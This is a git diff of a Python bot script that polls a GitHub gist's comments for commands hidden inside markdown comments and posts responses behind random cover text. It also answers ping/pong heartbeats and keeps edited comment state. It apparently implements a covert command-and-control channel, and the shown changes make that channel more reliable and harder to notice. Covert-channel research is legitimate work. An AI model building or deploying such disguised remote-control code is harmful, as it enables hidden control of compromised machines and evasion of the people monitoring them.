@@ -1,12 +1,11 @@
 #! /bin/python3
 import argparse
-from datetime import datetime
 import subprocess
 import requests
 from dotenv import dotenv_values
 import time
 
-from utils import create_markdown_comment, get_random_message, parse_markdown_comment
+from utils import create_markdown_comment, get_comment_text, get_markdown_timestamp, get_random_message, parse_markdown_comment
 
 parser = argparse.ArgumentParser(
     prog='bot.py',
@@ -27,7 +26,7 @@ parser.add_argument(
 
 args = parser.parse_args()
 
-if(github_token is None):
+if(github_token is None or args.token is not None):
     github_token = args.token
 
 gist_id = args.gistId
@@ -37,7 +36,9 @@ comments_url = f'{gist_url}/comments'
 headers = {"authorization": f'bearer {github_token}'}
 gist_response = requests.get(gist_url, headers=headers)
 gist = gist_response.json()
-state = {"last_update": gist['updated_at'], "pong_comment": None}
+
+state = {"last_update": gist['updated_at'],
+         "pong_comment": None, "command_comment": None, "pong_text": None, "command_text": None}
 
 try:
     print(f"Channel url: {gist['url']}")
@@ -55,9 +56,10 @@ def log(message):
 def get_latest_comments():
     response = requests.get(comments_url, headers=headers)
     comments = response.json()
-    latest = filter(
-        lambda comment: comment['updated_at'] > state['last_update'], comments)
-    return list(latest)
+    latest = list(filter(
+        lambda comment: comment['updated_at'] > state['last_update'], comments))
+    latest.sort(key=lambda comment: comment['updated_at'])
+    return latest
 
 
 def get_commands(comments):
@@ -66,39 +68,60 @@ def get_commands(comments):
     return filter(lambda command: command != '', commands)
 
 
-def post_command(message: str):
-    comment = f'{get_random_message()}\n\n{create_markdown_comment(message)}'
-    log(f'Sending command "{comment}"')
+def post_command(command: str):
+    def get_message():
+        state['command_text'] = state['command_text'] if state['command_text'] is not None else get_random_message()
+        return f"{state['command_text']}\n\n{get_markdown_timestamp()}\n\n{create_markdown_comment(command)}"
 
-    response = requests.post(
-        comments_url, json={"body": comment}, headers=headers)
+    command_comment = state['command_comment']
+    log(f'Sending response "{command}"')
+    if command_comment is None:
+        response = requests.post(
+            comments_url, json={"body": get_message()}, headers=headers)
+        state['command_comment'] = response.json()
+        log(response)
+        return response
 
+    response = requests.get(
+        f'{comments_url}/{command_comment["id"]}', headers=headers)
+
+    if(response.status_code == 404):
+        state['command_comment'] = None
+        return post_command(command)
+
+    response = requests.patch(
+        f"{comments_url}/{command_comment['id']}", json={"body": get_message()}, headers=headers)
     log(response)
-    state["last_update"] = response.json()['updated_at']
     return response
 
 
 def pong():
+
     def get_message():
-        return f"{get_random_message()}\n\n<!-- {datetime.now()} -->\n\n{create_markdown_comment('pong')}"
+        state['pong_text'] = state['pong_text'] if state['pong_text'] is not None else get_random_message()
+        return f"{state['pong_text']}\n\n{get_markdown_timestamp()}\n\n{create_markdown_comment('pong')}"
+
     pong_comment = state['pong_comment']
-    log(f'pong')
+    log(f'Sending "pong"')
+
     if pong_comment is None:
         response = requests.post(
             comments_url, json={"body": get_message()}, headers=headers)
         state['pong_comment'] = response.json()
-        return
+        state['last_update'] = state['pong_comment']['updated_at']
+        return response
 
     response = requests.get(
         f"{comments_url}/{pong_comment['id']}", headers=headers)
 
     if response.status_code == 404:
         state['pong_comment'] = None
-        pong()
-        return
+        return pong()
 
-    requests.patch(
+    response = requests.patch(
         f'{comments_url}/{pong_comment["id"]}', json={"body": get_message()}, headers=headers)
+    state['last_update'] = response.json()['updated_at']
+    return response
 
 
 def list_to_string(input: list[str], separator=', '):
@@ -144,8 +167,11 @@ while True:
     comments = get_latest_comments()
     if len(comments) == 0:
         log('No new commands')
-    if len(comments) > 0:
-        state['last_update'] = comments[-1]['updated_at']
-
+    for comment in comments:
+        command = parse_markdown_comment(comment['body'])
+        if command == 'ping' or command == 'pong':
+            break
+        if comment['updated_at'] > state['last_update']:
+            state['last_update'] = comment['updated_at']
     for command in get_commands(comments):
         handle_command(command)
